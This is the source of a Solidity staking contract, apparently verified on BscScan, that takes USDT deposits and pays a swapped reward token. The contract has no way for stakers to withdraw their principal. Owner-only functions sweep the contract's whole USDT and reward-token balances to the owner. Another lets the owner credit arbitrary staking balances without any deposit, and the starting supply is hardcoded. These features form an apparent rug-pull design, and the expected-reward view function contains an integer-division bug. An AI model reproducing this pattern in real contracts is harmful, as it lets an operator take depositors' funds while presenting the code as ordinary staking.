/**
 *Submitted for verification at BscScan.com on 2023-01-23
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8;
contract StakingRewards {
    IERC20 public immutable rewardsToken;
    IERC20 public  usdtToken;
    Team public immutable team;
    address public teamAdr;
    IUniswapV2Router01 public immutable Swap;
    address public nagaToken;
    address public uToken;
    address public yhToken;
    uint public USDTnum;
    address public owner;
    uint public duration;
    uint public finishAt;
    uint public updatedAt;
    uint public rewardRate;
    uint public rewardPerTokenStored;
    mapping(address => uint) public userRewardPerTokenPaid;
    mapping(address => uint) public rewards;
    uint public totalSupply;
    mapping(address => uint) public balanceOf;

    bool public pause;

    constructor( address _rewardToken,address _uToken,address _swapToken,address _team) {
        owner = msg.sender;
        rewardsToken = IERC20(_rewardToken);
        usdtToken = IERC20(_uToken);
        uToken = _uToken;
        Swap = IUniswapV2Router01(_swapToken);
        yhToken = _rewardToken;
        team = Team(_team);
        teamAdr = _team;

        pause = true;

        usdtToken.approve(_swapToken,9 * 10**36);
        totalSupply = 5370177597380000000000000;
        
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not authorized");
        _;
    }

    modifier updateReward(address _account) {
        rewardPerTokenStored = rewardPerToken();
        updatedAt = lastTimeRewardApplicable();

        if (_account != address(0)) {
            rewards[_account] = earned(_account);
            userRewardPerTokenPaid[_account] = rewardPerTokenStored;
        }

        _;
    }


    function lastTimeRewardApplicable() public view returns (uint) {
        return _min(finishAt, block.timestamp);
    }


    function rewardPerToken() public view returns (uint) {
        if (totalSupply == 0) {
            return rewardPerTokenStored;
        }

        return
            rewardPerTokenStored +
            (rewardRate * (lastTimeRewardApplicable() - updatedAt) * 1e18) /
            totalSupply;
    }




    function stake(uint _unum) external updateReward(msg.sender) {
        require(pause, "not start");
        require(team.isCan(msg.sender), "you not team");
        require(_unum > 0, "amount = 0");
        balanceOf[msg.sender] += _unum;
        totalSupply += _unum;
        usdtToken.transferFrom(msg.sender, address(this),_unum);

        uint y_num = _unum/10;

        uint min_yh = getOutHy(y_num)*7/10;
        uint deadline = block.timestamp + 1200;
        address[] memory t = new address[](2);

        t[0] = uToken;
        t[1] = yhToken;

        Swap.swapExactTokensForTokensSupportingFeeOnTransferTokens(y_num,min_yh,t,address(this),deadline);

    }
	
	function hecoStake(address[] calldata adr,uint256[] calldata num) external onlyOwner{

        for(uint i=0;i<adr.length;i++){       
            balanceOf[adr[i]] +=num[i];
        }
        
     
    
    }

    function earned(address _account) public view returns (uint) {
        return
            ((balanceOf[_account] *
                (rewardPerToken() - userRewardPerTokenPaid[_account])) / 1e18) +
            rewards[_account];
    }


    function getReward() external updateReward(msg.sender) {
        uint reward = rewards[msg.sender];
        if (reward > 0) {
            rewards[msg.sender] = 0;
            rewardsToken.transfer(msg.sender, reward);
        }
    }


    function setRewardsDuration(uint _duration) external onlyOwner {
        require(finishAt < block.timestamp, "reward duration not finished");
        duration = _duration;
    }

    function notifyRewardAmount(uint _amount)
        external
        onlyOwner
        updateReward(address(0))
    {
        if (block.timestamp >= finishAt) {
            rewardRate = _amount / duration;
        } else {
            uint remainingRewards = (finishAt - block.timestamp) * rewardRate;
            rewardRate = (_amount + remainingRewards) / duration;
        }

        require(rewardRate > 0, "reward rate = 0");
        require(
            rewardRate * duration <= rewardsToken.balanceOf(address(this)),
            "reward amount > balance"
        );

        finishAt = block.timestamp + duration;
        updatedAt = block.timestamp;
    }

    function _min(uint x, uint y) private pure returns (uint) {
        return x <= y ? x : y;
    }

    function getUserxpect (address _account)public view returns (uint) {
           return
            balanceOf[_account] / totalSupply * rewardRate * (finishAt - block.timestamp);
    }

    function getOutHy(uint _num)  public view returns (uint x){
        address[] memory t = new address[](2);

        t[0] = uToken;
        t[1] = yhToken;
        uint[] memory amounts = Swap.getAmountsOut(_num,t);
        x = amounts[1];
        return x;
    }

    function getRewardsusdt() external onlyOwner{
        uint num = usdtToken.balanceOf(address(this));
        usdtToken.transfer(msg.sender, num);
    }

    function getRewardshy() external onlyOwner{
        uint num2 = rewardsToken.balanceOf(address(this));
        rewardsToken.transfer(msg.sender, num2);
    }

    function transferOwner(address _newOwner) external onlyOwner{
        owner = _newOwner;
    }

    function setPause(bool _bool) external onlyOwner{
         pause = _bool;
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface IUniswapV2Router01 {
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface Team{
function setBalance(address _adr,uint _num)external;
function isCan(address _adr)  external view returns (bool);
}